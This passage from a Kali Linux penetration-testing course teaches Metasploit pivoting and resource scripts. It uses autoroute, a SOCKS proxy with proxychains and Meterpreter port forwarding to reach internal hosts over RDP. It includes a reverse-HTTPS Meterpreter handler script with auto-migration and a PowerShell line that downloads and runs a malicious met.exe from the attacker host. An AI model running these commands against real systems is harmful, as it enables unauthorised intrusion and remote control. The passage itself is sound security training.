### Module Options for `post/multi/manage/autoroute`

| Name     | Current Setting | Required | Description                                                                 |
|----------|-----------------|----------|-----------------------------------------------------------------------------|
| CMD      | autoadd         | Yes      | Specifies the autoroute command (Accepted: add, autoadd, print, delete, default) |
| NETMASK  | 255.255.255.0   | No       | Netmask (IPv4 as "255.255.255.0" or CIDR as "/24")                           |
| SESSION  | yes             | Yes      | The session to run this module on                                            |
| SUBNET   | no              | No       | Subnet (IPv4, for example, 10.10.10.0)                                      |

**Note:** PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. Made in Morocco. Penetration Testing with Kali Linux.

---

### Active Sessions

```plaintext
msf6 post(multi/manage/autoroute) > sessions -l
Active sessions
===============
Id  Name          Type         Information                    Connection
--  ----          ----         -----------                    ----------
12  meterpreter   x64/windows  ITWK01\luiza @ ITWK01          192.168.119.4:443 -> 127.0.0.1
```

### Setting and Running the Autoroute Module

```plaintext
msf6 post(multi/manage/autoroute) > set session 12
session => 12
msf6 post(multi/manage/autoroute) > run
[!] SESSION may not be compatible with this module:
[!] * incompatible session platform: windows
[*] Running module against ITWK01
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.5.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 192.168.50.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
```

### Invoking the Autoroute Module

The autoroute module added the subnet `172.16.5.0/24` to the routing table. We can now use the `psexec` module or combine routes with the `server/socks_proxy` auxiliary module to configure a SOCKS proxy. This allows applications outside of the Metasploit Framework to tunnel through the pivot on port 1080 by default. We set the `SRVHOST` option to `127.0.0.1` and `VERSION` to `5` to use SOCKS version 5.

### Using the `server/socks_proxy` Auxiliary Module

```plaintext
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > show options
Module options (auxiliary/server/socks_proxy):
Name        Current Setting  Required  Description
----        ---------------  --------  -----------
PASSWORD    no               No        Proxy password for SOCKS5 listener
SRVHOST     0.0.0.0         Yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
SRVPORT     1080            Yes       The port to listen on
USERNAME    no               No        Proxy username for SOCKS5 listener
VERSION     5               Yes       The SOCKS version to use (Accepted: 4a, 5)

Auxiliary action:
Proxy      Run a SOCKS proxy server

msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 0.
[*] Starting the SOCKS proxy server
```

### Configuring `proxychains`

We can now update our `proxychains` configuration file (`/etc/proxychains4.conf`) to use the SOCKS5 proxy.

```plaintext
kali@kali:~$ tail /etc/proxychains4.conf
# proxy types: http, socks4, socks5, raw
# * raw: The traffic is simply forwarded to the proxy without modification.
# ( auth types supported: "basic"-httpo "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

### Using `proxychains` with `xfreerdp`

Finally, we can use `proxychains` to run `xfreerdp` to obtain GUI access from our Kali Linux system to the target machine on the internal network.

```plaintext
kali@kali:~$ sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.5.200:3389 ... OK
...
Certificate details for 172.16.5.200:3389 (RDP-Server):
Common Name: itwk02
Subject: CN = itwk02
Issuer: CN = itwk02
Thumbprint: 4b:ef:ec:bb:96:7d:03:01:53:f3:03:de:8b:39:51:a9:bb:3f:1b:b2:70:83:08:fc:a7:9a:ec:bb:e7:ed:98:36
The above X.509 certificate could not be verified, possibly because you do not have the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
Password:
...
```

### Gaining Remote Desktop Access

The `xfreerdp` client opens a new window providing us access to the GUI of `ITWK02` in the internal network via RDP.

### Port Forwarding with `portfwd`

We can also use the `portfwd` command from inside a Meterpreter session to forward a specific port to the internal network.

```plaintext
msf6 auxiliary(server/socks_proxy) > sessions -i 12
[*] Starting interaction with 5...
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
-h Help banner.
-i Index of the port forward entry to interact with (see the "list" command).
-l Forward: local port to listen on. Reverse: local port to connect to.
-L Forward: local host to listen on (optional). Reverse: local host to connect to.
-p Forward: remote port to connect to. Reverse: remote port to listen on.
-r Forward: remote host to connect to.
-R Indicates a reverse port forward.
```

### Creating a Port Forward

We can create a port forward from localhost port 3389 to port 3389 on the target host (172.16.5.200).

```plaintext
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200
[*] Local TCP relay created: :3389  172.16.5.200:3389
```

### Testing the Port Forward

Let’s test this by connecting to `127.0.0.1:3389` with `xfreerdp` to access the compromised host in the internal network.

```plaintext
kali@kali:~$ sudo xfreerdp /v:127.0.0.1 /u:luiza
[08:09:25:307] [1314360:1314361] [WARN][com.freerdp.crypto] -y Certificate verification failure 'self-signed certificate (18)' at stack position 0
[08:09:25:307] [1314360:1314361] [WARN][com.freerdp.crypto] - CN = itwk02
...
```

### Summary

In this section, we explored various methods and modules to pivot within Metasploit. We learned how to manually and automatically set routes through existing sessions and interact with systems reachable by these routes. Then, we leveraged the `socks_proxy` module to create a SOCKS proxy to reach the second target machine with `proxychains`. Finally, we used the Meterpreter command `portfwd` to forward ports.

### Automating Metasploit

This Learning Unit covers the following Learning Objectives:
- Create resource scripts
- Use resource scripts in Metasploit

Metasploit automates various tasks and operations for us, but we can create scripts to further automate repetitive commands inside the framework itself. These scripts are called Resource Scripts. In this Learning Unit, we’ll explore how to create and use them.

### Resource Scripts

Resource scripts can chain together a series of Metasploit console commands and Ruby code. Meaning, we can either use the built-in commands of Metasploit or write code in Ruby (as it’s the language Metasploit is developed in) to manage control flow as well as develop advanced logic components for resource scripts.

### Example: Creating a Resource Script

In a penetration test, we may need to set up several `multi/handler` listeners each time we want to receive an incoming reverse shell. We can create a resource script to automate this task for us.

Let’s create a resource script that starts a `multi/handler` listener for a non-staged Windows 64-bit Meterpreter payload. To do this, we can create a file in the home directory of the user `kali` named `listener.rc` and open it in an editor such as Mousepad.

```plaintext
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```

### Executing the Resource Script

Now, let’s save the script and start Metasploit by entering `msfconsole` with the resource script as an argument for `-r`.

```plaintext
kali@kali:~$ sudo msfconsole -r listener.rc
[sudo] password for kali:
...
[*] Processing listener.rc for ERB directives.
resource (listener.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (listener.rc)> set PAYLOAD windows/meterpreter/reverse_https
PAYLOAD => windows/meterpreter/reverse_https
resource (listener.rc)> set LHOST 192.168.119.4
LHOST => 192.168.119.4
resource (listener.rc)> set LPORT 443
LPORT => 443
resource (listener.rc)> set AutoRunScript post/windows/manage/migrate
AutoRunScript => post/windows/manage/migrate
resource (listener.rc)> set ExitOnSession false
ExitOnSession => false
resource (listener.rc)> run -z -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) >
[*] Started HTTPS reverse handler on https://192.168.119.4:443
```

### Connecting to the Target Machine

Let’s connect to the `BRUTE2` machine via RDP with user `justin` and password `SuperS3cure1337#`, start PowerShell, download the malicious Windows executable `met.exe` that we already used in previous sections, and execute it.

```plaintext
PS C:\Users\justin> iwr -uri http://192.168.119.4/met.exe -Outfile met.exe
PS C:\Users\justin> .\met.exe
```

### Incoming Connection and Successful Migration

Once `met.exe` gets executed, Metasploit notifies us about the incoming connection.

```plaintext
[*] Started HTTPS reverse handler on https://192.168.119.4:443
[*] https://192.168.119.4:443 handling request from 192.168.50.202; (UUID: rdhcxgcu)
Redirecting stageless connection from
/dkFg_HAPAAB9KHwqH8FRrAG1_y2iZHe4AJlyWjYMllNXBbFbYBVD2rlxUUDdTrFO7T2gg6ma5cI-GahhqTK9hwtqZvo9KJupBG7GYBlYyda_rDHTZ1aNMzcUn1x with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'
[*] https://192.168.119.4:443 handling request from 192.168.50.202; (UUID: rdhcxgcu)
Attaching orphaned/stageless session...
[*] Session ID 1 (192.168.119.4:443 -> 127.0.0.1) processing AutoRunScript 'post/windows/manage/migrate'
[*] Running module against BRUTE2
[*] Current server process: met.exe (2004)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 5340
[+] Successfully migrated into process 5340
[*] Meterpreter session 1 opened (192.168.119.4:443 -> 127.0.0.1) at 2022-08-02 09:54:32 -0400
```

### Provided Resource Scripts

Instead of creating our own resource scripts, we can also use the already provided resource scripts from Metasploit. They can be found in the `scripts/resource/` directory in the Metasploit directory.

```plaintext
kali@kali:~$ ls -l /usr/share/metasploit-framework/scripts/resource
total 148
-rw-r--r-- 1 root root 7270 Jul 14 12:06 auto_brute.rc
-rw-r--r-- 1 root root 2203 Jul 14 12:06 autocrawler.rc
-rw-r--r-- 1 root root 11225 Jul 14 12:06 auto_cred_checker.rc
-rw-r--r-- 1 root root 6565 Jul 14 12:06 autoexploit.rc
-rw-r--r-- 1 root root 3422 Jul 14 12:06 auto_pass_the_hash.rc
-rw-r--r-- 1 root root 876 Jul 14 12:06 auto_win32_multihandler.rc
```

**Note:** PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. Made in Morocco. Penetration Testing with Kali Linux.